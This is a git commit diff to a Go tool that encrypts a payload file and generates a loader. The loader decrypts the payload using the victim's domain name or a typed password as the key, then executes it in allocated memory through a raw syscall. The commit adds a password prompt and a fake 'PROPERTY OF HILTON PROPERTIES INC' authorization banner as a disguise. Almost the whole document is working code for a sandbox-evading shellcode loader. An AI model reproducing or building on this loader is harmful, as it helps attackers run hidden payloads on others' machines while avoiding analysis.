b785e85d0980c9567c1d8a8771a561413db57a23
alfarom256 <alfarom256@gmail.com>
2019-09-18 10:40:50 -0400

    god help me, added password, make your own damn preamble

--- src/main.go
+++ src/main.go
@@ -1,20 +1,19 @@
 package main
 
 import (
-	"DomainKeyedEnc/pkg/AntiSandbox"
 	"crypto/aes"
 	"crypto/cipher"
 	"encoding/base64"
 	"flag"
 	"io/ioutil"
+	"log"
 	"math/rand"
 	"os"
 	"text/template"
+	"time"
 )
 
-var (
-	DOMAIN_KEY = "WORKGROUP" // CHANGE ME!!!!!!
-)
+
 
 type args struct {
 	Key        string
@@ -29,6 +28,9 @@ func checkAndPanic(err error) {
 
 func generateRandomBytes(n int) ([]byte, error) {
 	b := make([]byte, n)
+	t := time.Now()
+
+	rand.Seed(int64(t.Second()))
 	_, err := rand.Read(b)
 	if err != nil {
 		return nil, err
@@ -37,20 +39,22 @@ func generateRandomBytes(n int) ([]byte, error) {
 }
 
 
-func encrypt(plaintext []byte) (string, string) {
+func encrypt(plaintext []byte, fullKey []byte) (string, string) {
 	key := make([]byte, 32)
 	var r_err error
 	var rand []byte
-	sbx := AntiSandbox.NewSBX()
-	rem := 32 - len(sbx.DomainName)
+	rem := 32 - len(fullKey)
+
+
+
 	if rem < 0 {
-		copy(key[0:24], []byte(sbx.DomainName)[0:24])
+		copy(key[0:24], []byte(fullKey)[0:24])
 		//key = []byte(sbx.DomainName[:24]) // truncate the result to 24c
 		rand, r_err = generateRandomBytes(8) // padding
 		//key[24:] = rand
 		copy(key[24:], rand)
 	} else {
-		copy(key[0:32-rem], sbx.DomainName)
+		copy(key[0:32-rem], fullKey)
 		rand, r_err = generateRandomBytes(rem) // padding
 		if r_err != nil {
 			os.Exit(0)
@@ -72,6 +76,7 @@ func main() {
 package main
 
 import (
+	"golang.org/x/crypto/ssh/terminal"
 	"DomainKeyedEnc/pkg/AntiSandbox"
 	"crypto/aes"
 	"crypto/cipher"
@@ -102,12 +107,32 @@ func alloc(size uintptr) (uintptr, error) {
 }
 
 func main() {
+	hilton_preample := `+"`" + `
+*********************************************************************
+*********************************************************************
+
+			PROPERTY OF HILTON PROPERTIES INC
+
+			AUTHORIZED PERSONNEL ONLY
+
+			ANY UNAUTHORIZED USE WILL LEAD TO
+		IMMEDIATE PROSECUTION PURSUANT TO CA. 1.3.189a
+
+*********************************************************************
+*********************************************************************
+	` + "`" + `
 	ciphertext, _ := base64.StdEncoding.DecodeString("{{.Ciphertext}}")
 	sbx := AntiSandbox.NewSBX()
 	domainName := sbx.DomainName
 	key, _ := base64.StdEncoding.DecodeString("{{.Key}}")
+	print(hilton_preample)
 
+	passwd := make([]byte, 0)
+	passwd, _ = terminal.ReadPassword(int(syscall.Stdin))
+	
+	domainName = string(passwd)
 	composite_key := make([]byte, 32)
+
 	dnLen := len(domainName)
 	copy(composite_key[0:dnLen], []byte(domainName))
 	copy(composite_key[dnLen:], key)
@@ -129,9 +154,24 @@ func main() {
 	syscall.Syscall(ptr, 0, 0, 0, 0)
 }
 `
+
+
 	file := flag.String("file", "", "file containing your payload")
-	DOMAIN_KEY = *flag.String("domain", "", "domain/workgroup to key against (Default: None)")
+	domainKey := flag.String("domain", "", "domain/workgroup to key against (Default: None)")
+	passwd := flag.String("password", "", "add an INTERACTIVE password prompt to enter a password for decrypting the payload")
 	flag.Parse()
+
+	fullKey := "My NaMe iS GoLAnG aND I fuCkInG BloW at VArIaBLE ScoPEEE"
+	_ = fullKey // HURR REMOVE ME AND THE WHOLE THING FUCKING BREAKS
+
+	if *passwd != "" && *domainKey != ""{
+		log.Fatal("Can't use domain keying and password at the same time as of this release")
+	} else if *passwd != ""{
+		fullKey = *passwd
+	} else {
+		fullKey = *domainKey
+	}
+
 
 
 	tmpl, err := template.New("body").Parse(body)
@@ -140,7 +180,7 @@ func main() {
 	data, err := ioutil.ReadFile(*file)
 	checkAndPanic(err)
 
-	ciphertext, key := encrypt(data)
+	ciphertext, key := encrypt(data, []byte(fullKey))
 	tmpl.Execute(os.Stdout, args{
 		Ciphertext: ciphertext,
 		Key:        key,
